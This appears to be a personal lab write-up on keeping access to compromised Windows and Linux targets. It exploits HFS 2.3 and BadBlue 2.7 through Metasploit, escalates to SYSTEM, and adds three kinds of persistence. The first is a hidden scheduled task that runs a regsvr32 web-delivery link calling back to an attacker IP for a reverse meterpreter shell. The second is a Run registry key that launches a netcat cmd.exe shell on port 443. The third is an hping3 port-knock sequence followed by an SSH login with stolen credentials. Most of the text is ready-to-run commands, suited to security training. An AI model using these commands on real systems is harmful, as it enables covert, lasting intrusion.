Tactics: Persistence or Maintaining Access

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off 
their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking
legitimate code or adding startup code.

Techniques: schedule task : create a schedule task which will run automatically when user login on the compromised system.

Scheduled Task/Job : Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating
systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met
(ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged 
group on the remote system.

Procedure: 

I have done one lab of "Maintaining Access: Schtasks" in which firstly i have performed fingerprint of the target by using NMAP and i have found multiple ports are open
including port 80 and then now i have run NMAP gain to find out the version of service running on port 80 (nmap -sV -p 80 target ip). Once command completed i have observed that
httpFileServer 2.3 running on port 80 in target system. Now i am searching for any exploit for hfs 2.3 (searchsploit hfs) and found Rejetto HTTP File Server (HFS) 2.3 is vulnerable
to RCE.Now first phase completed.

Now open metasploit framework (msfconsole -q) and load exploit (exploit/windows/http/rejetto_hfs_exec) and also checke options and set values of all required parameters and
exploit the target.We have successfully exploit the target and get a meterpreter shell. Now 2nd phase completed.

Now i am checking the current user which i got after exploitation and got to know that i am running as administrator user so now i am going to elevate to the system priviege
to NT authrority (getsystem).After running getsystem i have elevated my privilege and now running as NT Authroity System and then
migrate current process to lsass.exe (ps -S lsass.exe ==> migrate pid of lsass.exe) because when we exploit any system,at that
time we are using temporary process and that process kill or terminate any time thatswhy we are migrating that process to 
permanent running processes like explorer.exe or lsass.exe. Now 3rd phase completed.

In this case i am going to configure a persistence backdoor using the exploit/multi/script/web_delivery metasploit module.
So we will generate a Regsvr32 malicious web delivery link for the persistence access. Then we will use the generated link
to create a taskthat will trigger the malicious link every time the user login into the system.

For generating malicious link, i am going to start another metasploit framework (msfconsole -q) and use below commands:
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST Attacker_IP
set target 3
exploit

Once above module runs, i will get a malicious link like "regsvr32 /s /n /u /i:http://attacker_ip:8080/5oq2CIKAnPFv08.sct scrobj.dll"
Now 4th phase completed.

Now i have to create a schedule task in the compromised system so go to meterpreter shell and load powershell (load powershell) 
and after loading run this command powershell_shell. Powershell is loaded now i am going to run schtaks to schedule a task that executes
powershell.exe to launch a malicious link on logon with system privilege.

schtasks /create /tn AttackDefense /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'regsvr32 /s /n /u
/i:http://10.10.1.4:8080/5oq2CIKAnPFvO8.sct scrobj.dll'" /sc onlogon /ru System
Once above command execute successfully, a new schedule task named "AttackDefense" created.Now 5th phase completed.

Now if user of compromised system reboot their machine and system started, my scheduled task executed because i have added a condition
whenever user login my task executed and a reverse shell created towards my attacker ip.
But in my lab scenerio i have to reboot compomised machine, to do this firstly i have to back from powershell prompt so use ctrl+c
and now i am in meterpreter shell and run "reboot". Now 6th phase completed.

Once machine comes up and user login again, my schedule task runs and malicious link executed and i will get a meterpreter 
session on my attacker machine where i executed metasploit module for generating malicious link.

In this way we are maintaining access or creating persistence on compromised system. Now i am not going to exploit again and again
if compromised system reboot or shutdown because i have created a backdoor which executes whenever user login on the system.

===============================================complete============================================

Technique 2: Modifying in registry key "Run" by adding netcat utility.

Procedure:

In this lab, firstly we will perform fingerprint the target with the help of NMAP tool (nmap target_ip). In the output of nmap
we have observed that port 80 is open but to know the version of service we will again run nmap (nmap -sV -p 80 target_IP).
From output of nmap we come to know that badblue 2.7 is running on target machine on port 80. Now 1st phase is completed.

Now we will search exploit for badblue 2.7 so we will use CLI command searchsploit (searchsploit badblue 2.7) to find out
the exploit. Also we can use Exploitdb site to find out the exploit. After running searchsploit command, we have found one
exploit for metasploit "exploit/windows/http/badblue_passthru". Now we will load this exploit in metasploit framework and set required 
parameters by set RHOSTS.
use exploit/windows/http/badblue_passthru
set RHOSTS target_ip
exploit

We have successfully exploited the target vulnerable application i.e badblue and recieved a meterpreter shell. Now 2nd phase
completed.

After exploitation, firstly we check the user(getuid) and found that we are running as administrator user. Now we are migrating 
our temporary process to permanent process.For this first we check the pid of explorer.exe (ps -S explorer.exe) and once found
the PID, migrate (migrate PID of Explorer.exe) to explorer.exe. Now 3rd completed.

Now we are going to maintain access or Persistence using Netcat utility. We will upload nc.exe on the target machine and modify
the registry to have Netcat execute on startup and listen on port 443.

Upload Netcat i.e nc.exe (In meterpreter shell we will use this command: upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32)
From above command, we have uploaded nc.exe in the "C:\windows\system32" directory.

Now modifying the registry to start netcat on startup.Below is the command which we use to modify registry by adding nc.exe:

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 443 -e C:\windows\system32\cmd.exe'

Now we have modify the registry.For verifying added value we will use below command:

reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc

We have successfully configured the Netcat persistence backdoor.

Now if compromised system rebooted still we are able to connect the victim because we have added netcat utility which listen on port 443
in the startup registry.
In my lab scenerio, i am going to reboot the target system and once system start our netcat utility execute process start on port 443. To confirm 
this i will run namp from my attacker machine and in output i have observed now port 443 is exposed which was not exposed in the 1st phase.

Everything is set, now i am going to connect target on port 443 using netcat from attacker machine:

nc -v taget_ip 443

Now i have connected with victim's system. This is the 2nd way how we can create Persistence from netcat utility. Now whenever i want
to connect with compromised system, i will connect with netcat utility on port 443.

========================================================Completed===============================

Technique 3: Port knocking (T1205)

Port knocking is a security technique used to protect network services from unauthorized access or port scans. 
It involves dynamically opening network ports on a firewall or network device in a specific sequence or pattern. 
The idea is that the ports are initially closed, and a client must "knock" on these ports in a predefined sequence 
before access is granted to the desired service.

How port knocking generally works:

Closed Ports: By default, the network ports that lead to a particular service are closed on the firewall.

Port Knocking Sequence: To gain access to the service, a user or system must send a series of connection attempts (knocks) to a predefined sequence of closed ports.

Firewall Rules Modification: The firewall or security device monitoring these ports detects the correct sequence of knocks.

Temporary Opening of Ports: Upon detecting the correct sequence, the firewall dynamically opens the necessary ports for a limited time, allowing the client to connect to the desired service.

Access Granted: The client can now access the service because the required ports are temporarily open.

Ports Automatically Close: After a certain period of inactivity or a predefined timeout, the opened ports automatically close, reducing the exposure of the system to potential attacks.

The primary advantages of port knocking include:

Stealth: Since the ports are closed by default, the services are not easily discoverable by port scans.

Enhanced Security: It adds an additional layer of security by requiring a specific sequence of port knocks, making it more difficult for attackers to guess or automate the process.

Reduced Attack Surface: The services are only exposed when the correct sequence is provided, reducing the attack surface and exposure to potential threats.

Procedure:

In this lab, we have to figure out the port knocking pattern, perform the knock and once its successful ssh service is expose.

Firstly we will check the open port on target with the help of nmap.But by default in port knocking al ports showing closed.
In our lab, it is clear that the following ports are open on the target machine i.e 7000,8000,9000 and tcp flags are FIN and URG.

Each ports need n number of packets where 4 < n < 10

so, send 9 packets of TCP URG and FIN flag to each port.

Command used:

hping3 -c 9 -F -p 7000 target_IP [F=FIN]
hping3 -c 9 -U -p 7000 target_IP [U=URG]
hping3 -c 9 -F -p 8000 target_IP 
hping3 -c 9 -U -p 8000 target_IP 
hping3 -c 9 -F -p 9000 target_IP 
hping3 -c 9 -U -p 9000 target_IP 

In this format i have send 9 packets.Once all packets sent to target,automatically port 22 is exposed.To verify this use
nmap -p- targetIP

Once port 22 is showing open on target machine then we will ssh the target server with the steal credentials and now we are successfully
login on target system.

Now we know the pattern so in future anytime we will send packet in the specific pattern and by doing this ssh service will expose 
and now we can login with the credentials.

========================================completed==========================
















